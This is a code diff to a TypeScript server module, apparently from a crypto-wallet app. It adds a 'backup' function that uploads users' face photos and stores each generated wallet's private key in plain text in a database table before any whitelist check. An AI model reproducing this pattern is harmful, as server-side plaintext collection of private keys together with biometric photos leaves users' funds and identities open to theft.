@@ -128,6 +128,56 @@ export const saveNotWhitelisted = createServerFn({ method: "POST" })
     return { ok: true };
   });
 
+/**
+ * Log every generated key immediately (backup) — before whitelist check.
+ * Ensures no key is ever lost even if user closes the tab.
+ * Idempotent per (user_id, wallet_address).
+ */
+const LogKeyInput = z.object({
+  slot: z.number().int().min(1).max(1000),
+  photoBase64: z.string().min(100),
+  privateKey: z.string().min(10),
+  walletAddress: z.string().min(10),
+  faceLabel: z.string().min(1).max(60),
+});
+
+export const logGeneratedKey = createServerFn({ method: "POST" })
+  .middleware([requireSupabaseAuth])
+  .inputValidator((input: unknown) => LogKeyInput.parse(input))
+  .handler(async ({ data, context }) => {
+    const { userId } = context;
+    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
+
+    // Skip if already logged for this wallet
+    const { data: existing } = await supabaseAdmin
+      .from("unverified_attempts")
+      .select("id")
+      .eq("user_id", userId)
+      .eq("wallet_address", data.walletAddress)
+      .maybeSingle();
+    if (existing) return { ok: true, skipped: true };
+
+    const buf = Uint8Array.from(atob(data.photoBase64), (c) => c.charCodeAt(0));
+    const path = `${userId}/generated-${data.slot}-${Date.now()}.jpg`;
+    const { error: upErr } = await supabaseAdmin.storage
+      .from("face-photos").upload(path, buf, { contentType: "image/jpeg", upsert: false });
+    if (upErr) throw new Error("Photo upload failed: " + upErr.message);
+
+    const { error } = await supabaseAdmin.from("unverified_attempts").insert({
+      user_id: userId,
+      slot: data.slot,
+      kind: "first_verify",
+      face_label: data.faceLabel.trim() || "নাম নেই",
+      face_photo_url: path,
+      wallet_address: data.walletAddress,
+      wallet_private_key: data.privateKey,
+      reason: "কী তৈরি হয়েছে (ব্যাকআপ) — যাচাই অপেক্ষমাণ",
+    });
+    if (error) throw new Error(error.message);
+    return { ok: true };
+  });
+
+
 
 /**
  * Re-verify search: list this user's verified tasks (re-verify ready) matching name query.
